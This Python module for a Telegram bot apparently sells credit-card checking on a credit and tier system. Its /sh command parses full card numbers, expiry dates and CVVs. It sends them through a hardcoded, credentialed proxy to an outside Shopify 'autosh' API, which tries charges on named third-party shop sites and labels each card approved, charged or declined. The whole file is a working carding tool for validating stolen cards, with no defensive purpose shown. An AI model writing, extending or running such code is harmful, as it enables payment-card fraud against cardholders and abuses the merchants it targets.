import re
import random
import logging
import aiohttp
import asyncio
from datetime import datetime, timedelta
from typing import Dict, Optional, Tuple
from bin import get_bin_info
from database import get_user_credits, update_user_credits
from plans import get_user_current_tier

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

PROXIES = ["http://0A2JelrNEymAcMsT:cHo1x72JjZPwB0lg@geo.g-w.info:10080"]
SITE_URLS = ["https://naturallclub.com", "https://brittnetta.com", "https://brightland.co"]
API_URL = "http://autosh.nikhilkhokhar.com/shopify"

RETRY_ERRORS = ['r4 token empty', 'risky', 'product not found', 'hcaptcha detected', 'error', 'item', 'cURL error']
last_command_time = {}

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
    ]
    for p in patterns:
        m = re.match(p, card_string)
        if m:
            cc, mm, yy, cvv = m.groups()
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            return cc, mm, yy, cvv
    return None

def extract_card_from_text(text: str) -> Optional[str]:
    patterns = [r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})']
    for p in patterns:
        m = re.search(p, text)
        if m:
            cc, mm, yy, cvv = m.groups()
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            return f"{cc}|{mm}|{yy}|{cvv}"
    return None

async def check_card(card_details: str, user_info: Dict) -> str:
    parsed = parse_card_details(card_details)
    if not parsed:
        return "⚠️ Invalid card format"
    cc, mm, yy, cvv = parsed
    
    bin_details = await get_bin_info(cc[:6])
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country = bin_details.get("country") or "Unknown"
    flag = bin_details.get("country_emoji", "")
    
    for site in random.sample(SITE_URLS, len(SITE_URLS)):
        proxy = random.choice(PROXIES).replace('http://', '')
        url = f"{API_URL}?site={site}&cc={cc}|{mm}|{yy}|{cvv}&proxy={proxy}"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=30) as resp:
                    if resp.status != 200:
                        continue
                    data = await resp.json()
                    resp_text = data.get("Response", "")
                    price = data.get("Price", "0")
                    
                    if any(e in resp_text.lower() for e in RETRY_ERRORS):
                        continue
                    
                    status = "✅ APPROVED"
                    if "order_paid" in resp_text.lower():
                        status = "🔥 CHARGED"
                    elif "card_declined" in resp_text.lower():
                        status = "❌ DECLINED"
                    
                    return f"""<pre>⩙ STATUS ↬ {status}</pre>
<a href='https://t.me/farxxes'>⊀</a> Card: <code>{cc}|{mm}|{yy}|{cvv}</code>
<a href='https://t.me/farxxes'>⊀</a> Response: {resp_text[:100]}
<a href='https://t.me/farxxes'>⊀</a> Price: {price}
<pre>Bank: {brand} | {issuer}
Country: {country} {flag}</pre>
<a href='https://t.me/farxxes'>⌬</a> Dev: @ZenoRealWebs"""
        except:
            continue
    return "❌ All sites failed"

async def handle_sh_command(update, context):
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    user_tier = get_user_current_tier(user_id)
    
    current_time = datetime.now()
    if user_tier in ["Free"] and user_id in last_command_time:
        if (current_time - last_command_time[user_id]) < timedelta(seconds=10):
            await update.message.reply_text("⏳ Please wait 10 seconds.")
            return
    
    card_details = None
    if context.args:
        card_details = " ".join(context.args)
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        card_details = extract_card_from_text(update.message.reply_to_message.text)
    
    if not card_details:
        await update.message.reply_text("Usage: /sh CC|MM|YY|CVV")
        return
    
    credits = get_user_credits(user_id)
    if credits is not None and credits <= 0 and credits != float('inf'):
        await update.message.reply_text("❌ No credits left! Please recharge.")
        return
    
    msg = await update.message.reply_text(f"🔄 Checking card...\n{card_details}")
    
    if user_tier in ["Free"]:
        last_command_time[user_id] = current_time
    
    result = await check_card(card_details, {"id": user_id, "name": first_name})
    
    if credits != float('inf'):
        update_user_credits(user_id, -1)
        new_credits = get_user_credits(user_id)
        if new_credits <= 0:
            result += "\n\n⚠️ You have 0 credits left! Please recharge."
    
    await msg.edit_text(result, parse_mode='HTML')
